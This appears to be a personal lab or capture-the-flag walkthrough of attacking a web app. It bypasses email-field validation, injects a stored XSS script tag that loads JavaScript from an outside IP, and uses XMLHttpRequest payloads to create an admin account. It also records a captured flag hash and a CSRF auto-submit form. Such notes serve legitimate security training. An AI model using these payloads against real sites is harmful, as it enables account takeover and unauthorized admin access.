`http://mentor:80/`
![[Pasted image 20241122155130.png]]



#### initial xss testing ``
##### `http://mentor:80/contact`
`<script>alert(0)</script>` payload
![[Pasted image 20241122155351.png]]
nothing happened
![[Pasted image 20241122155430.png]]
`burpsuite` analysis
- the `email`, `subject`, `message` fields dont get rendered, the `name` field does  get encoded or something, could be  a potential `xss`
- `XSRF` and `CSRF` are the same things - CROSS SITE REQUEST FORGERY
![[Pasted image 20241122155612.png]]
upon testing and discord it is talked about the `email` field being the one thats vulnerable to `XSS` however when attempting to utilize the field we are forced to utilize an `email` address
![[Pasted image 20241122165035.png]]
in order to fix this we have to modify the permissions
- in the `ELEMENTS` section when inspecting `CTRL F` to search for the email field - need to change the `type` to `text` just like the name example
![[Pasted image 20241122165122.png]]
now the `input` type matches the `name` field
![[Pasted image 20241122165302.png]]
now test the field with a script alert that to see if the file is allowed to be pulled over
test payload
```bash
<script src="http://192.168.45.155:8000/xss.js"></script>
```
![[Pasted image 20241122165344.png]]
setup a python server
![[Pasted image 20241122165434.png]]
we get a response, so now we can see that `XSS` is a vulnerability, now we need to create a java payload that creates an admin user with the function found @ the `/login` page source code

original
```js
function addUser() {

	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function () {
		if (this.readyState == 4 && this.status == 200) {
			// Typical action to be performed when the document is ready:
			alert(xhttp.responseText)
			window.location = window.location;
		}
	};
	var creds = 'email=' + document.getElementById('email').value + '&password=' + document.getElementById('password').value + "&name=" + document.getElementById('name').value + "&username=" + document.getElementById('username').value;
	xhttp.open("GET", "/admin/users/add?" + creds, true);
	xhttp.send();
```
usercreate.js
```js
function addUser() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            // Typical action to be performed when the document is ready:
            alert(xhttp.responseText);
            window.location = window.location;
        }
    };
    var creds = 'email=bugs@test.local&password=bugs&name=bugs&username=bugs';
    xhttp.open("GET", "/admin/users/add?" + creds, true);
    xhttp.send();
}

```
usercreate2.js - worked - took the formatting out of discord - need to review source code to understand
the reason why we can make the payload without the `onreadystatechange`
### **What Happens Without It?**

If you skip the `onreadystatechange` setup:

1. The `XMLHttpRequest` will still send the request to the server.
2. The server will still process the request and potentially create the user if all required parameters and authentication are correct.
3. You just won't receive or handle the response within your script.
```js
var xhttp = new XMLHttpRequest();
var creds = 'email=bugs@test.local&password=bugs&name=bugs&username=bugs';
xhttp.open("GET", "/admin/users/add?" + creds, true);
xhttp.send();
```
payload to execute
```bash
<script src="http://192.168.45.155:8000/usercreate2.js"></script>
```
was able to login at `http://mentor:80/login` with `bugs:bugs` credentials
`Local.txt` : 174e3cefc2154c2dcda53ca136b713fe
![[Pasted image 20241122172830.png]]



CSRF Payload:
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="http://ofbiz:8443/admin/users/add?" method="GET" name="csrf">
  </form>
</body>
</html>
```
